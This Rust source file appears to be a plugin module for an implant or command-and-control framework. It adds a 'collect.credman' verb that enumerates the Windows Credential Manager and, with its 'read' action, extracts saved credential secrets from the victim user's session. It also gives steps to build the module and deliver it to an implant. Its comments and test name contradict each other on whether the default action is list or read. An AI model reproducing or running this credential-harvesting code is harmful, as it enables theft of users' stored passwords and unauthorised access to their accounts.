//! The credential collection family's fifth module (architecture.md
//! Sec 5.4): `collect.credman`, the Windows credential manager -- one
//! discrete collection technique whose halves stay honest about what
//! the act is: the survey that names the store's entries and the read
//! that takes their material, both riding the task audit every
//! dispatched action already enters.
//!
//! The grammar gives one verb two actions -- `list` reports the store's
//! inventory, one entry's shape per row (the default: a bare task is a
//! read), `read` takes the entries' material, every entry's or the one
//! the trailing target picks. The rows speak the credential-row
//! grammar: the credentials board parses them, masks the secret field
//! until an operator reveals it, and the audit chain never carries it
//! -- the family's first verb on the taxonomy's credential kind. The
//! material comes back through the credential API itself, so the
//! system performs its own decryption in the session that owns the
//! store and the module touches no crypto. The store the verb reaches
//! is the calling logon session's own: no privilege asked, no seat
//! implied -- an implant running as the desktop user reads that user's
//! saved entries, and the domain-credential types the system hands
//! back without their blobs render as the withholding they are.
//!
//! Build for a Windows target (`cargo build --release --target
//! x86_64-pc-windows-gnu`), deliver the cdylib's bytes as a
//! `module.load credman` task's content, then task `collect.credman`
//! like any compiled verb. A non-Windows build compiles for the lane
//! and refuses the verb at run time: the technique has no store there.

mod arguments;
mod credman;

use arguments::Arguments;
use rod_plugin_sdk::{rod_plugin, Plugin, Verb};

// The action the Windows dispatch matches on; off Windows the verb
// refuses before the name is ever spoken, and an unused import would be
// a build warning the lane turns into a failure.
#[cfg(windows)]
use arguments::Action;

pub struct CredMan;

impl Plugin for CredMan {
    fn name(&self) -> &'static str {
        "credman"
    }

    fn verbs(&self) -> Vec<Verb> {
        vec![Verb::new("collect.credman", credman_verb)]
    }
}

fn credman_verb(input: &str) -> Result<String, String> {
    let arguments = arguments::parse(input)?;
    arguments::validate(&arguments)?;
    execute(&arguments)
}

/// The Windows execution: the action the task named against the
/// store. One enumeration serves both actions -- the survey and the
/// read differ in what a row renders, not in what the API returns.
#[cfg(windows)]
fn execute(arguments: &Arguments) -> Result<String, String> {
    let entries = credman::enumerate()?;
    let host = std::env::var("COMPUTERNAME").ok();
    match arguments.action {
        Action::List => render(&entries, false, None, host.as_deref()),
        Action::Read => render(&entries, true, arguments.target.as_deref(), host.as_deref()),
    }
}

/// The entries as rows. The read's narrowing comes first -- the one
/// entry whose target name matches, the same case-fold the store's own
/// lookup holds, refusing once and named when nothing matches -- then
/// one row per entry, survey or read by policy alone.
#[cfg(windows)]
fn render(
    entries: &[credman::Entry],
    include_secret: bool,
    target: Option<&str>,
    host: Option<&str>,
) -> Result<String, String> {
    let selected: Vec<&credman::Entry> = match target {
        Some(one) => match entries.iter().find(|e| e.target.eq_ignore_ascii_case(one)) {
            Some(hit) => vec![hit],
            None => {
                return Err(format!(
                    "collect.credman: the store carries no entry targeted '{one}'"
                ))
            }
        },
        None => entries.iter().collect(),
    };
    if selected.is_empty() {
        return Ok("the credential manager carries no entries".to_string());
    }
    Ok(selected
        .iter()
        .map(|entry| credman::row(entry, include_secret, host))
        .collect::<Vec<_>>()
        .join("\n"))
}

/// The technique has no store off Windows; the manifest's targets keep
/// the module off other loads, and this refusal keeps a stray dispatch
/// honest about why it cannot run.
#[cfg(not(windows))]
fn execute(_arguments: &Arguments) -> Result<String, String> {
    Err(format!(
        "collect.credman: the Windows credential manager is a Windows technique; this \
         build runs on {}",
        std::env::consts::OS
    ))
}

rod_plugin!(CredMan);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn an_empty_task_is_the_read() {
        // The default action is list: a bare task reports the store's
        // inventory and pulls no secret into a row -- on a non-Windows
        // build it refuses, naming why.
        #[cfg(windows)]
        {
            let output = credman_verb("").expect("the read runs");
            assert!(
                output.contains("windows-credential-manager") || output.contains("no entries"),
                "{output}"
            );
        }
        #[cfg(not(windows))]
        {
            let refusal = credman_verb("").expect_err("off Windows the verb refuses");
            assert!(refusal.contains("Windows technique"), "{refusal}");
            assert!(refusal.contains(std::env::consts::OS), "{refusal}");
        }
    }

    #[test]
    fn a_bad_grammar_refuses_before_anything_runs() {
        assert!(credman_verb("dump LegacyProxy").is_err());
        assert!(credman_verb("list LegacyProxy").is_err());
        assert!(credman_verb("target=LegacyProxy").is_err());
    }
}
